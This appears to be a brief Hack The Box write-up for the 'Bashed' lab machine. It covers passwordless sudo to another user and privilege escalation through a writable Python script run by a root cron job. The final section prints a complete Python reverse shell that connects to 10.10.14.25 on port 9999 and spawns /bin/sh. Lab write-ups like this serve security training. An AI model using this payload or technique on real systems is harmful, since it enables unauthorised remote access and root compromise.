---
layout: post
title:  "HTB Bashed Linux"
description : 
tags: 
---

# HTB Bashed

# Recon
# Exploitation
1. We run LinuxEnum and we noticed that we are able to sudo commands without passwd for user
**scriptmanager**
```perl
sudo -u scriptmanager whoami
```
```perl
sudo -u scriptmanager bash
```
# Privilege Escalation
1. As scriptmanager user we locate a script folder that contain 2 insterested files
test.py and test.txt
2. test.txt is owned by root but the text.py is owned by scriptmanager
the text.txt file is update every minute so it appers is a cron job
so we modified the python file to pull to call for a reverse shell
```perl
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.25",9999))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
